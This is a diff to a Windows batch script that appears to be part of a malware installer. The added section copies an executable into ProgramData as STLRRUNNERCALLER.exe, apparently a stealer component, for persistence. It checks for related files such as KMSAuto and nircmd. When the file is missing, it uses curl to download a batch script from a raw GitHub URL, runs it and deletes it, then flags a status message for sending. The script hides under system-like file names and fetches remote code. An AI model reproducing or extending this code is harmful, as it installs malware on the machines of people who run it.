@@ -306,6 +306,27 @@ timeout /t 1 /nobreak >nul
 
 
 
+:STLRRUN
+echo :STLRRUN
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\WindowsTasks.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
 
 
 
@@ -328,7 +349,7 @@ set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
 set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
 set "file4=%APPDATA%\Microsoft\nircmd.exe"
 set "file5=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
-set "file6=%SystemRoot%\System32\curl.exe"
+set "file6=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
 
 :: Check each file
 if not exist "%file1%" goto STARTUPTAASK
@@ -336,6 +357,7 @@ if not exist "%file2%" goto STARTUPTAASK
 if not exist "%file3%" goto STARTUPTAASK
 if not exist "%file4%" goto STARTUPTAASK
 if not exist "%file5%" goto STARTUPTAASK
+if not exist "%file6%" goto STARTUPTAASK
 
 
 
@@ -347,7 +369,7 @@ echo ShellHost.exe Found in %file2% >> "%InstalledQWB%"
 echo KMSAuto.exe Found in %file3% >> "%InstalledQWB%"
 echo nircmd.exe Found in %file4% >> "%InstalledQWB%"
 echo CoreWorkerProcess.exe Found in %file5% >> "%InstalledQWB%"
-
+echo STLRRUNNERCALLER.exe Found in %file6% >> "%InstalledQWB%"
 
 
 
@@ -555,7 +577,7 @@ echo.
 
 :: Check nircmd.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\nircmd.exe" (
-    goto COMMANDSFORAGENTS
+    goto CheckSTLRRUN
 )
 
 :: Run commands if Nircmd.exe is not found
@@ -580,6 +602,49 @@ if exist "%embeddedScript%" (
 
 set "MESSAGE=%MESSAGE%NIRCMD|"
 set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+:CheckSTLRRUN
+echo :CheckSTLRRUN
+echo.
+
+:: Check STLRRUNNERCALLER.exe; if found, skip to next section
+if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" (
+    goto COMMANDSFORAGENTS
+)
+
+:: Run commands if STLRRUNNERCALLER.exe is not found
+echo Checking for STLRRUNNERCALLER...
+set "embeddedScript=temp_script_STLRRUNINST.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/STLRRUNNERCALLER"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+    echo.
+    echo.
+) else (
+    echo Filed to get content from NIRCMD Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckNIRCMD
+)
+
+set "MESSAGE=%MESSAGE%STLRRUN|"
+set "CheckSend=1"
+
 
 
 
